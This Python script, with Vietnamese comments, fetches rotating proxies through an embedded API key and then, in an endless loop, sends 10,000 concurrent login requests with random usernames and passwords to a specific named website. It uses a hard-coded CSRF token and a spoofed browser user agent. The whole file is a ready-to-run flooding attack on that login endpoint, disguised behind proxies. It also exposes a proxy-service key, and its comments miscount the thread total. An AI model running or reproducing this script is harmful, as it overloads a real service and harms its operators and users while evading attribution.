import requests
import random
import string
import concurrent.futures
import time
def get_and_use_proxy():
    # 1. Địa chỉ API lấy proxy của bạn (thay bằng link thật của bạn)
    api_url = f"https://api.proxyxoay.org/api/key_xoay.php?key=eaNoJbFf0GRsuTQsgWbz&live=1"

    try:
        # Gọi API để lấy thông tin proxy
        response = requests.get(api_url)
        response.raise_for_status() # Kiểm tra nếu lỗi kết nối
        
        # Chuyển dữ liệu JSON trả về thành List
        data = response.json() 
        proxy_str = data['proxyhttp']
        # 2. Tách chuỗi proxy để đưa vào định dạng của thư viện requests
        # Cấu trúc: ip:port:user:pass
        parts = proxy_str.split(':')
        ip, port, user, password = parts[0], parts[1], parts[2], parts[3]
        
        # Định dạng chuẩn cho Requests: http://user:pass@ip:port
        proxy_format = f"http://{user}:{password}@{ip}:{port}"
        print (proxy_format)
        return proxy_format

    except Exception as e:
        print(f"[!] Có lỗi xảy ra: {e}")
def generate_random_string(length=10, complexity='medium'):
    """Tạo chuỗi ngẫu nhiên dựa trên mức độ phức tạp."""
    chars = string.ascii_lowercase + string.digits
    if complexity == 'high':
        chars += string.ascii_uppercase + "!@#$%"
    
    return ''.join(random.choice(chars) for _ in range(length))

def run(proxy_format):
    """Hàm thực hiện gửi request login với dữ liệu ngẫu nhiên."""
    url = 'http://gunchienbinh.com/a-gunga/login'
    csrf_token = 'fPjAezEUAog36E5uY6AMuCdCzNLd9aVYEOZ7jKqX'
    # Tạo dữ liệu ngẫu nhiên
    user = generate_random_string(8)
    password = generate_random_string(12, complexity='high')
    
    headers = {
        'X-CSRF-TOKEN': csrf_token,
        'Referer': 'http://gunchienbinh.com/',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }

    data = {
        'username': user,
        'password': password
    }
      
    proxies = {
        "http": proxy_format,
        "https": proxy_format
    }

    try:
        with requests.Session() as session:
            response = session.post(url, headers=headers, data=data,proxies=proxies,timeout=10)
            return {
                'username': user,
                'password': password,
                'status_code': response.status_code,
                'response': response.text
            }
    except Exception as e:
        return {'error': str(e)}

# --- Cách sử dụng ---


def main(proxy_format):
    start_time = time.time()
    
    # Sử dụng ThreadPoolExecutor để quản lý 1000 luồng
    # max_workers=1000 xác định số lượng luồng tối đa chạy song song
    with concurrent.futures.ThreadPoolExecutor(max_workers=10000) as executor:
        # Gửi 1000 tác vụ vào pool
        # range(1, 1001) tạo ra ID từ 1 đến 1000
        futures = [executor.submit(run,proxy_format) for i in range(1, 10001)]
        
        # Chờ và lấy kết quả khi các luồng hoàn thành
        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
                # print(result) # Bỏ comment nếu muốn xem chi tiết từng luồng
            except Exception as e:
                print(f"Luồng gặp lỗi: {e}")

    end_time = time.time()
    print("---")
    print(f"Tất cả 1000 luồng đã xử lý xong!")
    print(f"Tổng thời gian thực hiện: {end_time - start_time:.2f} giây")

if __name__ == "__main__":
    while True:
        proxy_format=get_and_use_proxy()
        main(proxy_format)
